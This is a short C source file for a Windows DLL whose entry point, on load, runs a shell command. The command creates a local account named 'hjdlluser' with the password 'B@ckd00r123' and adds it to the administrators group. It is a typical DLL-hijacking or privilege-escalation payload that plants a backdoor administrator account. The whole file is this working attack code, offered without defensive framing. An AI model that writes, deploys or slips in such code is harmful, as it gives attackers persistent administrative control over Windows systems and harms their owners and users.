#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user /add hjdlluser B@ckd00r123 && net localgroup administrators hjdlluser /add");
        ExitProcess(0);
    }
    return TRUE;
}
